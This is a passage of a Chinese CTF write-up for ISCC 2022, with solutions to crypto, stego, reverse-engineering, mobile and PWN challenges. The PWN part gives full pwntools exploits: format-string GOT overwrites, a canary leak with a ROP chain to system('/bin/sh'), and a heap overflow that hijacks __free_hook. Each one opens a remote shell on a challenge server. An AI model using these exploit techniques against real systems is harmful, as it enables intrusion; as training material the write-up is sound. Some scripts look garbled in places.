63035795145332257671110618754242812319412358745570179949829104657791665675480259338228488240452172475363993781946567214140071689730597091676924635337666041026748259004653243201003399276554500, 13189986625164442133210084295476894490640116756733531036044924355555127993186837134306976392035419483325751906098295742029817206682768342920654845357323042907301486682385483087515626774642983, 56479004843147047171593377125630572933044188348660633825638380537481087842510559431561593902889277909735622988511294737943589757547993119607061747602839484836518764277869991350077042440305063])
nbit = len(pubKey)
encoded = (2639622584605651396581817251490032779454497426926835395155361491646809433696877389021382879271034071363673713244579933536498932208083160752102337857045696761077282255141184610061711587402657723)
A =              Matrix(ZZ, nbit + 1, nbit + 1)
for i in range(nbit):
    A[i, i] = 1
for i in range(nbit):
    A[i, nbit] = pubKey[i]
A[nbit, nbit] = -(encoded)

res = A.LLL()
for i in range(0, nbit + 1):
    M = res.row(i).list()
    flag = True
    for m in M:
        if m != 0 and m != 1:
            flag = False
            break
                                                             #print 1
    if flag:
        print (i, M)
                                         #print over
        M = &#x27;&#x27;.join(str(j) for j in M)
        M = M[:-1]
        M = hex(int(M, 2))[2:-1]
        print (M)</code></pre>
<p>sageMath在线解密这个脚本运行得到十六进制，然后转字符串得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image060.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{Rs3C-zKM5-pIee}</p>
<h3 id="隐秘的信息">隐秘的信息</h3>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image062.png?x-oss-process=hzy" alt="img"></p>
<p>base64解密得到解压包密码<code>easy_to_find_the_flag</code>，解压之后得到一个图片，lsb通道，提取前两行</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image064.png?x-oss-process=hzy" alt="img"></p>
<p>在线网站https://gchq.github.io/解密得到flag<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image066.png?x-oss-process=hzy" alt="img"></p>
<h2 id="re">RE</h2>
<h3 id="amys-code">Amy’s Code</h3>
<p>附件拉到ida里面，main反编译</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image068.png?x-oss-process=hzy" alt="image-20220501120411753"></p>
<p>sub_4115FF，sub_411433为主要函数。跟进sub_411433</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image070.png?x-oss-process=hzy" alt="image-20220501120516031"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image072.png?x-oss-process=hzy" alt="image-20220501120524119"></p>
<p>跟进sub_4115FF</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image073.png?x-oss-process=hzy" alt="image-20220501120814513"><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image075.png?x-oss-process=hzy" alt="image-20220501120838415"></p>
<pre><code class="hljs plaintext">v6=&#x27;LWHFUENGDJGEFHYDHIGJ&#x27;
v9=[149,169,137,134,212,188,177,184,177,197,192,179,153,129,196,124,142,174,106,184]
str=&#x27;&#x27;
flag=&#x27;&#x27;
for i in range(len(v6)):
    str+=chr(v9[i]-ord(v6[i]))
for i in range(len(v9)):
    flag+=chr(ord(str[i])^i)
print(flag)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image076.png?x-oss-process=hzy" alt="image-20220501121303256"></p>
<h3 id="sad-code">Sad Code</h3>
<p>main函数反编译</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image078.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">from z3 import *
s = Solver()
v16=[Int(&#x27;v16[%d]&#x27;%i) for i in range(7)]
v15=Int(&#x27;v15&#x27;)
s.add(v16[1] + 7 * v16[0] - 4 * v15 - 2 * v16[2] == 0x1E9CE8CDB)
s.add(5 * v16[2] + 3 * v16[1] - v16[0] - 2 * v15 == 0x13CFADB9E)
s.add(2 * v16[0] + 8 * v16[2] + 10 * v15 - 5 * v16[1] == 0x4CD876232)
s.add(7 * v15 + 15 * v16[0] - 3 * v16[2] - 2 * v16[1] == 0x7CC936A0B)
s.add(15 * v16[3] + 35 * v16[6] - v16[4] - v16[5] == 0x10D543E690)
s.add(38 * v16[5] + v16[3] + v16[6] - 24 * v16[4] == 0x664955F03)
s.add(38 * v16[4] + 32 * v16[3] - v16[5] - v16[6] == 0x13F5455D8A)
s.add(v16[3] + 41 * v16[5] - v16[4] - 25 * v16[6] == 0x41D596666)
if s.check():
    print(s.model())</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image080.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">from Crypto.Util.number import long_to_bytes
v16=[0]*7
v16[2] = 1261262927
v16[4] = 1112026458
v15 = 1230193475
v16[6] = 1515477117
v16[3] = 1447647832
v16[1] = 1180258382
v16[5] = 1346916437
v16[0] = 2068662353
flag=long_to_bytes(v15)
for i in v16:
    flag+=long_to_bytes(i)
print(flag)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image082.jpg?x-oss-process=hzy" alt="img"></p>
<p>得到ISCC{MHQFYPNK-XOVIZXBH-ZPHPUZTX}</p>
<h3 id="getthetable">GetTheTable</h3>
<p>下载附件，反编译之后base58解码得到答案</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image084.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image085.png?x-oss-process=hzy" alt="img"></p>
<h3 id="bobs-code">Bob’s Code</h3>
<p>首先将附件反编译，审计</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image087.png?x-oss-process=hzy" alt="img"></p>
<p>审计之后发现需要将<code>.W1BqthGbfihKthkzV1tYc.hl5oY5qcbJ3XhXQXXlRoWBWdhRTXORpf1RwoF0.</code>偏移2，使用以下脚本</p>
<pre><code class="hljs plaintext">#include&lt;string.h&gt;
#include&lt;stdio.h&gt;
int main()&#123;
                    char s[] = &quot;.W1BqthGbfihKthkzV1tYc.hl5oY5qcbJ3XhXQXXlRoWBWdhRTXORpf1RwoF0.&quot;;
                    int w = 2;
                     for (int  i = 0;i&lt;strlen(s); ++i )
                      &#123;
                        if ( s[i] &lt; 65 || s[i] &gt; 90 )
                        &#123;
                          if ( s[i] &gt;= 97 &amp;&amp; s[i] &lt;= 122 )
                            s[i] = (s[i] - w - 97 + 26) % 26 + 97;
                        &#125;
                        else
                          s[i] = (s[i] - w - 65 + 26) % 26 + 65;
                        printf(&quot;%c&quot;,s[i]);
                      &#125;
                    return 0;
&#125;</code></pre>
<p>偏移得到<code>.U1ZorfEzdgfIrfixT1rWa.fj5mW5oazH3VfVOVVjPmUZUbfPRVMPnd1PumD0.</code>然后通过base64码表<code>ABCDEfghijklmnopqrsTUVWXYZabcdeFGHIJKLMNOPQRStuvwxyz0123456789-_</code>解码得到base64加密的内容<code>SVNDQ3tabDR1OTVhRy1nNk8wTUhURi1FTlZkVjMwZn0=</code>，然后解码得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image089.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{Zl4u95aG-g6O0MHTF-ENVdV30f}</p>
<h3 id="vigenerelike">VigenereLike</h3>
<p>附件分析</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image091.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;
def My_base64_decode(inputs):
    bin_str = []
    for i in inputs:
        if i != &#x27;=&#x27;:
            x = str(bin(s.index(i))).replace(&#x27;0b&#x27;, &#x27;&#x27;)
            bin_str.append(&#x27;&#123;:0&gt;6&#125;&#x27;.format(x))
    outputs = &quot;&quot;
    nums = inputs.count(&#x27;=&#x27;)
    while bin_str:
        temp_list = bin_str[:4]
        temp_str = &quot;&quot;.join(temp_list)
        if (len(temp_str) % 8 != 0):
            temp_str = temp_str[0:-1 * nums * 2]
        for i in range(0, int(len(temp_str) / 8)):
            outputs += chr(int(temp_str[i * 8:(i + 1) * 8], 2))
        bin_str = bin_str[4:]
        print(&quot;input1&quot;)
    return outputs
a = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;
b = &quot;rJFsLqVyFKYTn2Wgeuo8u Ltm8T0o2wCK9mmCrv=&quot;
key = &quot;ISCCYES&quot;
v17 = [1,2,3,4,5,6,7]
flag = &quot;&quot;
flag1 = &quot;&quot;
for i in range(len(b)-1):
    flag += a[(a.find(b[i]) - a.find(key[i%7]) + 63) % 63]
    print(&quot;input2&quot;)
flag =flag+ &quot;=&quot;
flag = My_base64_decode(flag)
for i in range(len(flag)):
    flag1 += chr(ord(flag[i]) ^ v17[i%7])
    #print(&quot;result&quot;)
print(&quot;ISCC&#123;&quot;+flag1[:-4]+&quot;&#125;&quot;)</code></pre>
<p>ISCC{Reverse-8QN61wE6-2SLeGLYX}</p>
<h3 id="ruststr">Ruststr</h3>
<p>附件反编译寻找main，分析之后，qmemcpy函数的写个脚本跑一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image093.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">b = [0x9A, 0x78, 0xB6, 0x12, 0xBE, 0x66, 0x8D, 0xCF, 0x51, 0x9E,
     0x63, 0xCB, 0x4A, 0xD1, 0x1A, 0x59, 0x78, 0x1C, 0x17, 0x73,
     0xF2, 0x1D, 0x05, 0x2F, 0xF0, 0xD7, 0xB3, 0x22, 0x5D, 0xAD,
     0x0B, 0xE2]

table=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;
decode=&quot;5EvneNRco/dq9yu7ZJdOCj5LUQePeWBbmw==&quot;       

x=&quot;&quot;.join(map(lambda x:bin(table.index(x))[2:].zfill(6),decode))
c=[]
for i in range((len(x))//8):
    c.append(int(&#x27;0b&#x27;+x[i*8:(i+1)*8],2))
    print(hex(c[i]),end=&quot; &quot;)
    #print(&quot;!&quot;),debug test运行
m = []
for i in range(len(c)):
    m.append(c[i]^b[i])
    print(&quot;1&quot;)
key = [0x32, 0x63, 0x65, 0x61, 0x39, 0x66, 0x30, 0x34, 0x63, 0x36, 0x33,
       0x62, 0x34, 0x32, 0x38, 0x33, 0x39, 0x34, 0x30, 0x65, 0x63, 0x30,
       0x65, 0x36, 0x64, 0x32, 0x39, 0x62, 0x65, 0x32, 0x38, 0x64]
def lll(a,b):
    if a&gt;b:
        return 0
    else:
        return -1
f = &#x27;&#x27;
for i in range(len(m)):
    for j in range(128):
        if (lll((key[i]+0xd0)&amp;0xff,0xa) + j +2)&amp;0xff == m[i]:
            f += chr(j)
            print(f)
            break
p = list(f[::-1])

print()
def ppp(num):
    a = num&amp;1
    return a==0
for i in range(len(p)):
    if ord(&#x27;a&#x27;)&lt;=ord(p[i])&lt;=ord(&#x27;z&#x27;):
        p[i] = chr(ord(p[i])^0x20)
    elif ord(&#x27;A&#x27;)&lt;=ord(p[i])&lt;=ord(&#x27;Z&#x27;):
        p[i] = chr(ord(p[i])^0x20)
    elif ord(&#x27;0&#x27;) &lt;=ord(p[i])&lt;=ord(&#x27;9&#x27;):
        a = ord(p[i]) + 1
        b = ord(p[i]) - 1
        if ppp(ord(p[i])):
            p[i] = chr(a)
        else:
            p[i] = chr(b)
    else:
        pass
for i in range(len(p)):
    print(p[i],end=&#x27;&#x27;)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image095.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{Reverse-NgH86-9IHo0}</p>
<h2 id="pwn">PWN</h2>
<h3 id="create_id">create_id</h3>
<p>格式化字符串漏洞</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image097.png?x-oss-process=hzy" alt="img"></p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">from pwn import *

r = remote(&#x27;123.57.69.203&#x27;,5310)
HI = int(r.recvuntil(&quot;\n&quot;)[:-1],16)

r.sendline(&#x27;6&#x27;)
r.sendline(&#x27;7&#x27;)
r.sendline(&#x27;8&#x27;)

r.sendlineafter(&quot;\n&quot;,b&quot;%9c%12$n&quot;+p32(HI))
result = r.recvuntil(&quot;&#125;&quot;)

print(result)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image099.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{0d11-0757-4e20-805a-e0a3}</p>
<h3 id="sim_treasure">sim_treasure</h3>
<p>分析sp1附件，循环类型格式化字符串</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image101.png?x-oss-process=hzy" alt="img"></p>
<p>脚本如下:</p>
<pre><code class="hljs plaintext">from pwn import *
context(arch=&#x27;i386&#x27;)

r = remote(&#x27;123.57.69.203&#x27;,7010)

elf = ELF(binary)

libc = elf.libc

offset = 6

r.recvuntil(&quot;Can you find the magic word?\n&quot;)
r.sendline(&#x27;%35$p&#x27;)
libc_base = int(r.recvuntil(b&#x27;\n&#x27;)[:-1],16)-libc.symbols[&#x27;__libc_start_main&#x27;]-241
system = libc_base+libc.symbols[&#x27;system&#x27;]
sh = libc_base+0x17E3CF
success(hex(libc_base))

r.sendline(&#x27;%2$p&#x27;)
eip_addr = int(r.recvuntil(b&#x27;\n&#x27;)[:-1],16)+4
r.sendline(&#x27;%3$p&#x27;)
code_addr = int(r.recvuntil(b&#x27;\n&#x27;)[:-1],16)-0x16CA
success(hex(code_addr))

payload = fmtstr_payload(offset,&#123;code_addr+0x2A60:system&#125;)

r.sendline(payload)
r.send(b&#x27;/bin/sh\x00&#x27;)

sleep(0.3)
r.sendline(&#x27;cat flag&#x27;)

r.interactive()</code></pre>
<p>ISCC{1127-c2c2-4f8a-a0a7-e630}</p>
<h3 id="跳一跳">跳一跳</h3>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image103.png?x-oss-process=hzy" alt="img"></p>
<p>__readfsqword函数，直觉告诉我应该是泄露Canary，脚本如下</p>
<pre><code class="hljs plaintext">from pwn import *
from LibcSearcher import LibcSearcher

context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)


l32 = lambda                                                                          :u32(sh.recvuntil(&quot;\x7f&quot;)[-4:].ljust(4,&quot;\x00&quot;))
l64 = lambda                                                                          :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))

leak= lambda name,data                               :sh.success(name + &quot;: 0x%x&quot; % data)

sa  = lambda a,b     
s                  = lambda payload                        :sh.send( payload)
:sh.sendafter(str(a),str(b))
sl  = lambda payload                                    :sh.sendline(payload )
sla = lambda a,b                                                :sh.sendlineafter(str (a),str(b))

r   = lambda numb=4096                   :sh.recv(numb)
ru  = lambda a                                                                     :sh.recvuntil(str(a))
rl                 = lambda                                                                                 :sh.recvline()
uu32= lambda data                                         :u32(data.ljust(4, b&#x27;\x00&#x27;))
uu64= lambda data                                         :u64(data.ljust(8, b&#x27;\x00&#x27;))
                    print(&quot;success&quot;)

def b(addr):
                    bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot; #pie
                    attach(sh,bk+&quot;\nc&quot;)
                    success(&quot;attach&quot;)

filename = &quot;pwn&quot;
elf = ELF(&quot;./pwn&quot;)
def pwn(ip,port,debug,remote_libc , local_libc):
                    global sh
                    # global libc     
                    if(debug == 1):
                                         sh = process(&quot;./&#123;&#125;&quot;.format(filename))
                                         # sh = process(&quot;&quot;, env=&#123;&quot;LD_PRELOAD&quot;: libc_path&#125;)
                                         #  p=process([&quot;ld.so&quot;,&quot;./goal&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;libc.so&quot;&#125;, stdout=stdout, stdin= stdin)
                                         libc = local_libc
                    else:
                                         sh = remote(ip,port)
                                         libc = remote_libc
                    # sh.timeout =   0.1
                    #b(0x1217) #printf



                    ru(&quot;of pwn~&quot;)

                    for i in range(0xd8+1):
                                         #sleep(0.01)
                                         sl(b&quot;210&quot;)
                    s(b&#x27;a&#x27;)

                    
                    print(&quot;success&quot;)

                    ru(&quot;input: &quot;)
                    data = r()
                    print(&quot;data==&gt;&quot;,data)


                    canary_int = u64(data[-13:-6].rjust(8,b&quot;\x00&quot;))#data[-8:]
                    print(&quot;__canary==&gt;&quot;,hex(canary_int),type(canary_int))  

                    instant_rsp = u64(data[-6:].ljust(8,b&quot;\x00&quot;))
                    print(&quot;instant_rsp==&gt;&quot;,hex(instant_rsp))


                    read = 0x121c
                    # print( rbp - 0xe0)                                                                                                                                                                                                                                
                    s((0xe0-0x8 )*b&quot;a&quot;  + p64(canary_int) +  p64(instant_rsp + 0xe0) +p8(0x01))
                    ru(&quot;input: &quot;)
                    data = r()
                    A_elfaddr = u64(data[-6:].ljust(8,b&quot;\x00&quot;))#;print(&quot;A_elfaddr==&gt;&quot;,hex(A_elfaddr))
                    pie = A_elfaddr - 0x12b0
                    elf_bss = elf.bss() + pie;data = elf_bss + 0x330

                    read = pie + read
                    buf = b&quot;a&quot;*(0xe0-8);canary = canary_int;rbp = data;rip = read
                    print(&quot;data = rbp1/rsp1=&gt;&quot;,hex(rbp),&quot;rip1=&gt;&quot;,hex(rip))
                    s(buf + p64(canary) + p64(rbp) + p64(rip) )

                    ret = 0x1016 + pie
                    pop_rdi_ret = 0x130b + pie
                    leave_ret = 0x124A + pie
                    puts_got = elf.got[&quot;puts&quot;] + pie;puts_plt = elf.plt[&quot;puts&quot;] + pie
                    read_got = elf.got[&quot;read&quot;] + pie;read_plt = elf.plt[&quot;read&quot;] + pie
                    printf_got = elf.got[&quot;printf&quot;] + pie;setbuf_got = elf.got[&#x27;setbuf&#x27;]


                    next_read_ptr = data + 0x200 ;print(&quot;rbp3=next_read_ptr&quot;,hex(next_read_ptr))
                    print(&quot;rsp=&gt;&quot;,hex(data+0x8))
                    rop = p64(next_read_ptr)

                    rop +=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)
                    rop += p64(pop_rdi_ret)+p64(read_got)+p64(puts_plt)
                    rop += p64(pop_rdi_ret)+p64(printf_got)+p64(puts_plt)
                    
                    rop += p64(ret)+ p64(read)+p64(leave_ret)
                    rop += p64(canary)*int(27 - 13)
                                         
                    buf = rop;canary = canary_int;rbp = data-0xe0;rip = leave_ret

                    print(&quot;next_read_ptr = rbp2&quot;,hex(rbp),&quot;rip2=&gt;&quot;,hex(rip))
                    s(buf + p64(canary) + p64(rbp) + p64(rip))

                    raw_input()

                    puts_addr = u64(r(7)[-7:-1].ljust(8,b&quot;\x00&quot;)) ;leak(&quot;puts_addr&quot;,puts_addr)
                    read_addr = u64(r(7)[-7:-1].ljust(8,b&quot;\x00&quot;)) ;leak(&quot;read_addr&quot;,read_addr)
                    printf_addr = u64(r(7)[-7:-1].ljust(8,b&quot;\x00&quot;));leak(&quot;printf_addr&quot;,printf_addr)

                    
                    
                    &quot;&quot;&quot;
                    puts_addr = u64(r(6).ljust(8,b&quot;\x00&quot;)) ;leak(&quot;puts_addr&quot;,puts_addr);
                    data2 = r(0xf)
                    read_addr = u64(data2[-14:-8].ljust(8,b&quot;\x00&quot;)) ;leak(&quot;read_addr&quot;,read_addr);rl()
                    printf_addr = u64(data2[-7:-1].ljust(8,b&quot;\x00&quot;));leak(&quot;printf_addr&quot;,printf_addr);rl()
                    #setbuf_addr = u64(r(7)[-7:-1].ljust(8,b&quot;\x00&quot;));leak(&quot;setbuf_addr&quot;,setbuf_addr)
                    &quot;&quot;&quot;

                    #puts_addr = u64(data[])
                    libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)
                    libc.add_condition(&quot;read&quot;, read_addr)
                    libc.add_condition(&quot;printf&quot;, printf_addr)
                    libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)


                    print(&quot;######################## third ########################&quot;)
                    system_addr = libc_base + libc.dump(&#x27;system&#x27;)
                    bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)
                    leak(&quot;system_addr&quot;,system_addr);leak(&quot;bin_sh_addr&quot;,bin_sh_addr)

                    rop = p64(next_read_ptr-0xe0)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)
                    rop += p64(canary)*int(27 - 5)
                    #rop.ljust(0xe0-8,b&quot;a&quot;)
                    buf = rop;canary = canary_int;rbp = next_read_ptr-0xe0;rip = leave_ret
                    s(buf + p64(canary) + p64(rbp) + p64(rip))


                    sh.interactive()


if __name__ == &quot;__main__&quot;:
                    pwn(&quot;123.57.69.203&quot;,7020,0, remote_libc = 0 , local_libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;))</code></pre>
<p>跑脚本后得到flag</p>
<h3 id="untidy_note">untidy_note</h3>
<p>堆溢出漏洞，脚本如下:</p>
<pre><code class="hljs plaintext">from pwn import *
context(arch=&#x27;amd64&#x27;)

binary = &#x27;./untidy_note&#x27;
r = remote(&#x27;123.57.69.203&#x27;,7030)
elf = ELF(binary)

libc = ELF(&#x27;libc-2.27.so&#x27;)

def Allocate(size=0x18):
    r.sendlineafter(&quot;CHOOSE\:\n&quot;,&#x27;1&#x27;)
    r.sendlineafter(&quot;note size is:\n&quot;,str(size))
    print(&quot;1&quot;)

def Free(index):
    r.sendlineafter(&quot;CHOOSE:\n&quot;,&#x27;2&#x27;)
    r.sendlineafter(&quot;index:\n\n&quot;,str(index))
    print(&quot;2&quot;)

def Edit(index,payload):
    r.sendlineafter(&quot;CHOOSE:\n&quot;,&#x27;3&#x27;)
    r.sendlineafter(&quot;index:\n&quot;,str(index))
    r.sendlineafter(&quot;size is:\n&quot;,str(len(payload)))
    r.sendafter(&quot;Content:\n&quot;,payload)
    print(&quot;3&quot;)
def Show(index):
    r.sendlineafter(&quot;CHOOSE:\n&quot;,&#x27;4&#x27;)
    r.sendlineafter(&quot;index:\n&quot;,str(index))
    print(&quot;4&quot;)
r.sendlineafter(&quot;NAMEIS:&quot;,&#x27;HN-影影卷起来了&#x27;)
for i in range(26):
    Allocate(0x1f)
Allocate(0x8)#26
for i in range(26):
    Free(i)
Edit(26,b&#x27;a&#x27;*0x18+p32(0x11))
Allocate()
Allocate()
Show(1)
libc_base = u64(r.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-998-10-libc.symbols[&#x27;__malloc_hook&#x27;]
free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]
system = libc_base+libc.symbols[&#x27;system&#x27;]
success(&quot;system -&gt; &quot;+hex(system))
success(&quot;libc_base -&gt; &quot;+hex(libc_base))

Allocate(0x1f)
Allocate(0x1f)
Allocate(0x1f)
Allocate(0x1f)
Allocate(0x1f)
Allocate(0x1f)
Allocate(0x1f)

Free(4)
Free(5)
Free(6)
Edit(6,p64(free_hook))
Allocate(0x1f)
Allocate(0x1f)
Edit(8,p64(system))
# print(&quot;success&quot;)
Allocate(0x18)
Edit(9,b&#x27;/bin/sh\x00&#x27;)
Free(9)

r.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image105.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{af72-d61a-45d7-8845-0404}</p>
<h2 id="mobile">mobile</h2>
<h3 id="mobilea">MobileA</h3>
<p>APK反编译</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image107.png?x-oss-process=hzy" alt="img"></p>
<p>flag被分成了两段，先把<code>R0ZacFlGeUNsT3Z5LzJuc0ltRHJhRTQrQS9TUDBxcjVxblMrL01iUHoxST0=</code>base解密之后aes解密得到flag前半段,在这里发现偏移量和密钥</p>
<pre><code class="hljs plaintext">byte[] arrayOfByte3 = (new String(Base64.encode(&quot;K@e2022%%y&quot;.getBytes(StandardCharsets.UTF_8), 0))).replace(&quot;\n&quot;, &quot;&quot;).getBytes(StandardCharsets.UTF_8);
  byte[] arrayOfByte2 = (new String(Base64.encode(&quot;I&amp;V2022***&quot;.getBytes(StandardCharsets.UTF_8), 0))).replace(&quot;\n&quot;, &quot;&quot;).getBytes(StandardCharsets.UTF_8);</code></pre>
<p>密钥和偏移量进行base64编码后进行aes解密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image109.png?x-oss-process=hzy" alt="img"></p>
<p>然后</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image111.png?x-oss-process=hzy" alt="img"></p>
<p>这个是cmd5解密得到flag后半段，组合得到ISCC{mb…o_jghgfTSAD_no}</p>
<h3 id="mobileb">MobileB</h3>
<p>首先先将apk文件进行反编译得到伪代码得到重要信息</p>
<pre><code class="hljs plaintext">**private** **boolean** Jformat(String paramString) &#123;
   **return** (paramString.length() &lt; 10) ? **false** : ((paramString.substring(0, 5).equals(&quot;ISCC&#123;&quot;) &amp;&amp; paramString.charAt(paramString.length() - 1) == &#x27;&#125;&#x27; &amp;&amp; a.a(stringFromJNI(paramString.substring(5, paramString.length() - 1))).equals(&quot;52405240520120520134034020134030120130&quot;)));
  &#125;</code></pre>
<p>用apktool反编译得到so文件</p>
<p>分析得知，之间存在联系，exp如下</p>
<pre><code class="hljs plaintext">a=input(&quot;RESUULT:&quot;)[:-1]
b=input(&quot;ONE&quot;)
b+=b
c=input(&quot;TWO&quot;)
c+=c
d=input(&quot;THREE&quot;)
d+=d
e=input(&quot;FOUR&quot;)
e+=e
f=input(&quot;FIVE&quot;)
f+=f
g=input(&quot;SIX&quot;)
g+=g
h=input(&quot;SEVEN&quot;)
h+=h
i=input(&quot;EIGHT&quot;)
i+=i
j=input(&quot;NINE&quot;)
j+=j
k=input(&quot;TEN&quot;)
k+=k
l=input(&quot;ELENVE&quot;)
l+=l
m=input(&quot;TWLVE&quot;)
m+=m
n=[5,1,51,2,52,12,512,3,53,13,513,23,523,123,5123,4,54,14,514,24,524,124,5124,34,534,134,5134,234,5234,1234,51234]
# PRINT(&quot;1&quot;)
a=list(map(int,a.split(&quot;0&quot;)))
o=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
p=[]
for r in a:
                                         p.append(o[n.index(r)])
q=[d,m,g,i,h,c,e,l,b,f,j,k]
print(&quot;ISCC&#123;&quot;,end=&#x27;&#x27;)
# print(&quot;1&quot;)
for r in range(12):
                                         print(q[r][q[r].index(p[r],26)-9],end=&#x27;&#x27;)
print(&#x27;&#125;&#x27;)</code></pre>
<h1 id="擂台赛wp">擂台赛wp</h1>
<h2 id="misc">MISC</h2>
<h3 id="666">666</h3>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image113.png?x-oss-process=hzy" alt="img"></p>
<p>是伪加密，把09改为00即可成功解压。</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image115.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image116.png?x-oss-process=hzy" alt="img"></p>
<p>这个时候发现flag.rar这个压缩包也需要密码，所以拿这个图片下手，steghide扫描一下，发现一个密码为123456的high.png,查看分离的图片修改高度得到一堆字符，是压缩包密码!@#$%678()_+,然后得到pcap文件进行流量分析，追踪tcp得到一个网址，<a href="https://www.cnblogs.com/konglingdi/p/14998301.html">https://www.cnblogs.com/konglingdi/p/14998301.html</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image118.png?x-oss-process=hzy" alt="img"></p>
<p>访问之后发现是个动图<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image119.gif?x-oss-process=hzy" alt="img"></p>
<p>分析得到base64编码<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image121.png?x-oss-process=hzy" alt="img"></p>
<p>SElERWtleTo4NTIgOTg3NDU2MzIxIDk4NDIzIDk4NDIzIFJFQUxrZXk6eFN4eA==</p>
<p>解码得到HIDEkey:852 987456321 98423 98423 REALkey:xSxx</p>
<p>通过九宫格推出reakey为ISCC</p>
<p>还有一个是</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image122.png?x-oss-process=hzy" alt="img"></p>
<p>pQLKpP/EPmw301eZRzuYvQ==，aes解码，密码是ISCC，得到flag ISCC{lbwmeiyoukaig}</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image124.png?x-oss-process=hzy" alt="img"></p>
<h3 id="扫">扫！</h3>
<p>附件一堆图片–二维码掩码，转八进制之后得到新的压缩包，再次解压，。里面是flag.txt,打开得到flag<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image126.png?x-oss-process=hzy" alt="img"></p>
<p>flag{S0_Many_qR}</p>
<h3 id="真扫yoo">真扫yoo</h3>
<p>得到大量条形码，拿出来一个stegsolve看看信息</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image128.png?x-oss-process=hzy" alt="img"></p>
<p>有提示，</p>
<pre><code class="hljs plaintext">53 56 4E 44 51 33 74 6A 4D 47 52 6C 4D 7A 6B 6D 59 7A 42 6B 5A 54 45 79 4F 47 46 33 59 58 30 3D</code></pre>
